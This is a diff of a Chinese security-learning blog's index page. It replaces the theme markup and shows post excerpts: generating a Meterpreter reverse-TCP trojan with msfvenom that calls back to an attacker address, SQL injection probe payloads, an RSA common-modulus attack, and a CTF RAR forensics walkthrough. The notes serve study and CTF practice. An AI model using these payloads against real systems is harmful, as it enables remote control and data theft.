@@ -1,524 +1,293 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <meta name="theme-color" content="#3367D6"/>
-  <link rel="apple-touch-icon" href="/icons-192.png">
-  <link rel="manifest" href="/manifest.json">
-  
-  <meta name="generator" content="Hexo 5.4.0">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HappyCoder'Home</title><meta name="author" content="zhangkaibin"><meta name="copyright" content="zhangkaibin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="HappyCoder&#39;Home">
+<meta property="og:url" content="https://zhangkaibin0921.github.io/page/2/index.html">
+<meta property="og:site_name" content="HappyCoder&#39;Home">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zhangkaibin0921.github.io/img/tou.png">
+<meta property="article:author" content="zhangkaibin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhangkaibin0921.github.io/img/tou.png"><link rel="shortcut icon" href="/img/main.png"><link rel="canonical" href="https://zhangkaibin0921.github.io/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HappyCoder\'Home',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-02-06 21:33:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-  
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-  
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-  
-    <meta name="author" content="zhangkaibin">
-  
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-
-  <title>HappyCoder&#39;Home</title>
-
-  
-
-  
-    <link rel="shortcut icon" href="/favicon.ico">
-  
-
-  
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
-  
-
-  
-<link rel="stylesheet" href="/css/style.css">
-
-<link rel="alternate" href="/atom.xml" title="HappyCoder'Home" type="application/atom+xml">
-</head>
-<body>
-  <div class="root-container">
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-<!-- header container -->
-<header class="header-container">
-  
-    <div class="post-image" style="background-image: url(https://img.zcool.cn/community/015fc55a6ef507a801213466c389d1.jpg@1280w_1l_2o_100sh.jpg)"></div>
-  
-
-  <!-- navbar -->
-<nav class="navbar">
-  <div class="navbar-content">
-    <!-- logo -->
-    <div class="navbar-logo">
-      <a href="/">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          HappyCoder&#39;Home
-        
-      </a>
-    </div>
-    <!-- link -->
-    <div class="navbar-link">
-      <div class="navbar-btn">
-        <div></div>
-        <div></div>
-        <div></div>
-      </div>
-      <ul class="navbar-list">
-        
-          <li class="navbar-list-item"><a href="/">首页</a></li>
-        
-          <li class="navbar-list-item"><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_55675216?spm=1001.2014.3001.5343">友链</a></li>
-        
-          <li class="navbar-list-item"><a href="/about">关于</a></li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-  
-    <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">HappyCoder&#39;Home</h1>
-        
-      </div>
-    </div>
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-  
-</header>
-
-    <!-- 首页 -->
-
-<!-- post list container -->
-<div class="body-container">
-  <div class="content-container layout-block article-list">
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/9.jpg"></div>
-          
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="HappyCoder'Home" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tou.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/7.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">HappyCoder'Home</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">HappyCoder'Home</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/zhangkaibin0921" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/" title="kali渗透工具制作木马病毒"><img class="post_bg" src="/picture/cover/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali渗透工具制作木马病毒"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/" title="kali渗透工具制作木马病毒">kali渗透工具制作木马病毒</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-11T07:23:16.000Z" title="Created 2022-01-11 15:23:16">2022-01-11</time></span></div><div class="content">1、msfvenom生成远控木马msfvenom是用来生成后门软件，在目标机上执行后门，在本地监听上线。(msfvenom在shell里使用，不是在msfconsole终端)
 
-          <div class="card-text">
-            
-              <a href="/2022/01/11/kali%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92/" itemprop="url">
-                <h2 class="card-text--title">kali渗透工具制作木马病毒</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-11T07:23:16.000Z" itemprop="datePublished">2022-01-11</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-</ul>
-          </div>
-        </article>
-      </div>
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/1.jpg"></div>
-          
-
-          <div class="card-text">
-            
-              <a href="/2022/01/11/SQL%E6%B3%A8%E5%85%A5/" itemprop="url">
-                <h2 class="card-text--title">SQL注入</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-11T06:29:39.000Z" itemprop="datePublished">2022-01-11</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/web/">🏷️ web</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
+      
+      
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/3.jpg"></div>
-          
+      
+msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.88.123   lport=9999  -f  exe  -o   demo.exelhost攻击机的地址，lport：1~65535自己任选，不要选已在工作中的端口    
+查询kali的ip地址ifconfig或ip add
 
-          <div class="card-text">
-            
-              <a href="/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" itemprop="url">
-                <h2 class="card-text--title">RSA共模攻击和gmpy2、libnum常用函数</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-10T07:55:23.000Z" itemprop="datePublished">2022-01-10</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/Crypto/">🏷️ Crypto</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/16.jpg"></div>
-          
-
-          <div class="card-text">
-            
-              <a href="/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/" itemprop="url">
-                <h2 class="card-text--title">攻防世界simpleRAR</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-09T11:14:55.000Z" itemprop="datePublished">2022-01-09</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/misc/">🏷️ misc</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
+      
+      
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/5.jpg"></div>
-          
+  
 
-          <div class="card-text">
-            
-              <a href="/2022/01/09/misc%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" itemprop="url">
-                <h2 class="card-text--title">misc压缩文件处理</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-09T02:24:30.000Z" itemprop="datePublished">2022-01-09</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/misc/">🏷️ misc</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
+
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/7.jpg"></div>
-          
-
-          <div class="card-text">
-            
-              <a href="/2022/01/08/misc%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" itemprop="url">
-                <h2 class="card-text--title">misc图片隐写</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-08T04:23:05.000Z" itemprop="datePublished">2022-01-08</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/misc/">🏷️ misc</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
+      
+      
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/6.jpg"></div>
-          
+  
+现在木马就生成好了
 
-          <div class="card-text">
-            
-              <a href="/2022/01/07/misc%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E9%9A%90%E5%86%99/" itemprop="url">
-                <h2 class="card-text--title">misc文件操作</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2022-01-07T11:03:46.000Z" itemprop="datePublished">2022-01-07</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/misc/">🏷️ misc</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/14.jpg"></div>
-          
-
-          <div class="card-text">
-            
-              <a href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF/" itemprop="url">
-                <h2 class="card-text--title">金盾杯</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2021-12-12T10:54:28.000Z" itemprop="datePublished">2021-12-12</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-</ul>
-          </div>
-        </article>
-      </div>
+      
+      
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/15.jpg"></div>
-          
+  
+再点击open folder就可以看到demo.exe了
+2、开启监听在msfconsole中开启监听，等待受害者运行上钩use exploit/multi/handlerset payload window ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/01/11/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="post_bg" src="/picture/cover/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/11/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-11T06:29:39.000Z" title="Created 2022-01-11 14:29:39">2022-01-11</time></span></div><div class="content">判断是否存在SQL注入漏洞SELECT  first_name,last_name  FROM users WHERE  user_id=’1’ and 1=1#‘用户输入的数据为1’ and 1=1#
+SELECT  first_name,last_name  FROM users WHERE  user_id=’1’ and 1=2#‘用户输入的数据为1’ and 1=2#
+两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞
+如果利用SQL注入漏洞1、判断数据库列数  order by [column_num]SELECT first_name,last_name  FROM users WHERE  user_id=’1’  order by 1 #‘SELECT first_name,last_name  FROM users WHERE  user_id=’1’  order by 2 #‘SELECT first_name,last_name  FROM users WHERE  user_id=’1’  order by 3 #‘ 
+当表中只 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" title="RSA共模攻击和gmpy2、libnum常用函数"><img class="post_bg" src="/picture/cover/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RSA共模攻击和gmpy2、libnum常用函数"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/10/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" title="RSA共模攻击和gmpy2、libnum常用函数">RSA共模攻击和gmpy2、libnum常用函数</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-10T07:55:23.000Z" title="Created 2022-01-10 15:55:23">2022-01-10</time></span></div><div class="content">攻击条件当两个用户使用相同的模数N、不同的私钥时，加密同一明文消息时，即存在同模攻击
+攻击原理设两个用户的公钥分别为e1和e2，且两者互质。明文信息为m，密文分别为:
 
-          <div class="card-text">
-            
-              <a href="/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/" itemprop="url">
-                <h2 class="card-text--title">古典密码原理实现</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2021-11-29T09:23:46.000Z" itemprop="datePublished">2021-11-29</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/Crypto/">🏷️ Crypto</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
     
-      <div class="article-item layout-padding">
-        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
-          
-            <div class="card-cover" background-image-lazy data-img="/picture/cover/13.jpg"></div>
-          
-
-          <div class="card-text">
-            
-              <a href="/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/" itemprop="url">
-                <h2 class="card-text--title">Crypto在线解密网站</h2>
-              </a>
-            
-            <div class="card-text--row">
-              <span>发布于</span>
-              <time  class="" datetime="2021-11-28T12:40:20.000Z" itemprop="datePublished">2021-11-28</time>
-            </div>
-            <ul class="wrap-list dark">
-  
-</ul>
-            <ul class="wrap-list dark">
-  
-    <li><a href="/tags/Crypto/">🏷️ Crypto</a></li>
-  
-</ul>
-          </div>
-        </article>
-      </div>
+      
+      
     
-  </div>
-</div>
+  
 
-<!-- page container -->
+​    
+当攻击者截获c1和c2后，就可以恢复出明文。用扩展欧几里得算法求出re1+se2=1 mod  n 的两个整数r和s，由此可得:
 
-  <nav class="page-container">
     
-    <a class="extend prev" rel="prev" href="/">ʚ</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">ɞ</a>
-  </nav>
+      
+      
+    
+                                        
 
-
-
-    <!-- footer container -->
-<footer id="footer" class="footer">
-    <div class="footer-container">
-        
-            <div class="social-icons">
-                
-                    
-                            
-                    
-                            
-                    
-                            
-                    
-                        <a href="https://github.com/zhangkaibin0921" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
-                            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
-</svg>
-                        </a>
-                        
-                            
-                    
-                            
-            </div>
-            
-                <p>&copy;
-                    2022
-                        <a href="/" target="_blank">
-                            zhangkaibin
-                        </a>
-                </p>
-
-                
-
-                        <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
-
-                        <p>
-                            <a href="javascript:;" id="theme-light">🌞 浅色</a>
-                            <a href="javascript:;" id="theme-dark">🌛 深色</a>
-                            <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
-                        </p>
-                        <span id="sitetime"></span>
-                        <script language=javascript>
-                            function siteTime() {
-                                window.setTimeout("siteTime()", 1000);
-                                var seconds = 1000;
-                                var minutes = seconds * 60;
-                                var hours = minutes * 60;
-                                var days = hours * 24;
-                                var years = days * 365;
-                                var today = new Date();
-                                var todayYear = today.getFullYear();
-                                var todayMonth = today.getMonth() + 1;
-                                var todayDate = today.getDate();
-                                var todayHour = today.getHours();
-                                var todayMinute = today.getMinutes();
-                                var todaySecond = today.getSeconds();
-                                /* 
-                                Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
-                                year - 作为date对象的年份，为4位年份值
-                                month - 0-11之间的整数，做为date对象的月份
-                                day - 1-31之间的整数，做为date对象的天数
-                                hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
-                                minutes - 0-59之间的整数，做为date对象的分钟数
-                                seconds - 0-59之间的整数，做为date对象的秒数
-                                microseconds - 0-999之间的整数，做为date对象的毫秒数
-                                    */
-                                var t1 = Date.UTC(2021, 10, 24, 15, 00, 00); //北京时间2018-2-13 00:00:00
-                                var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
-                                var diff = t2 - t1;
-                                var diffYears = Math.floor(diff / years);
-                                var diffDays = Math.floor((diff / days) - diffYears * 365);
-                                var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
-                                var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
-                                var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
-                                document.getElementById("sitetime").innerHTML = " 本站已运行" + /*diffYears+" 年 "+*/ diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                            }
-                            siteTime();
-                        </script>
-
-    </div>
-
-
-
-</footer>
-  </div>
-
-  <div class="back-to-top-fixed soft-size--round soft-style--box">
-    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
-      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
-      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
-    </svg>
-  </div>
-
-  
-  <!-- aplayer -->
-
-
-<!-- dplayer -->
-
-
-
-
+​                                
+例题
+    
+      
+      
+    
   
 
+123456789101112131415161718192021import gmpy2from Crypto.Util.number import *#数字n、c1、c2都太长了，我直接去了n=e1= 2333e2= 23333c1=c2=gcd, s, t = gmpy2.gcdext(e1, e2)#广义欧几里得求出s,t  gcdext返回值为e1,e2最 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/" title="攻防世界simpleRAR"><img class="post_bg" src="/picture/cover/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界simpleRAR"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/01/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CsimpleRAR/" title="攻防世界simpleRAR">攻防世界simpleRAR</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2022-01-09T11:14:55.000Z" title="Created 2022-01-09 19:14:55">2022-01-09</time></span></div><div class="content">
+    
+      
+      
+    
+  拿到压缩包里面只有一个flag.txt内容为flag is not here
+把压缩包丢入010editor
 
+    
+      
+      
+    
+  
+这是上一篇压缩文件分析中提到的的，有时候给出的RAR文件的头部各个字块会故意给错导致无法识别文件块的第三个字节为类型块，也叫头类型头类型是0x72表示是标记块头类型是0x73表示是压缩文件头块头类型是0x74表示是文件头块头类型是0x75表示是注释头块
+因为flag.txt文件的内容为flag is not here，所以可以找到下一个文件的文件头，把7A改成74即可看到了secret.png
+
+    
+      
+      
+    
   
 
+查看exif无果，把secret丢入010editor中，文件头是gif类型的，更改后缀名(但其实不更改也可以正常打开，我也不知道为啥)，然后看不出来什么了。
+把图片丢入stegsolve中，更改颜色通道,看到了这个
 
+    
+      
+      
+    
+  
